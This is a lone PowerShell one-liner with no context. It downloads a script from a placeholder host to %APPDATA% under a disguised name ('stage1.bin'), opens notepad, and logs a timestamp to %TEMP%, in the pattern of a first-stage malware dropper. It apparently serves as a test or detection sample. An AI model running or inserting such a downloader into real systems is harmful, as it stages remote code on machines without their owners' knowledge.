
(New-Object System.Net.WebClient).DownloadFile('https://internal.corp/updater.ps1', "$env:APPDATA\stage1.bin"); Start-Process -FilePath 'notepad.exe'; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
